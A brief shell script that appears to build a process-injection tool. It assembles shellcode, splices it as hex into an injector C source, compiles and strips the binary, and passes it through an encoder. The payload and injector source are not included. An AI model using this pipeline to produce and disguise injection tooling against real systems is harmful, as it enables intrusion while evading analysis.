#!/bin/sh

nasm -felf64 inject.s && ld -o inject inject.o
objcopy -O binary inject shellcode
HEX=$(hexdump -v -e '"\\xx" 1/1 "%02x"' shellcode)
sed -e "s/SHELLCODE/$(echo $HEX)/" ./injector.c | gcc -x c -o cube - -lprocps
strip cube
python3 encoder.py cube cubes011
